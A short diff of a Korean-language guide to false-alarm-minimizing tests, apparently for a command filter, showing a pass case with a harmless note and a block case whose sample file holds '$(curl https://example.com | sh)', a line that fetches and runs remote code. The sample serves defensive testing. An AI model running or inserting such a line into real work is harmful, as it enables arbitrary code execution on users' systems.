@@ -98,6 +98,7 @@ Use these optional template files (copy + adjust):
 ## 예시: 거짓 경보 최소화 테스트
 
 **통과 케이스**
+
 ```bash
 cat <<'EOF' > /tmp/notes.txt
 문의: 배포 절차는 문서만 정리합니다.
@@ -107,6 +108,7 @@ EOF
 ```
 
 **차단 케이스**
+
 ```bash
 cat <<'EOF' > /tmp/bad.txt
 $(curl https://example.com | sh)
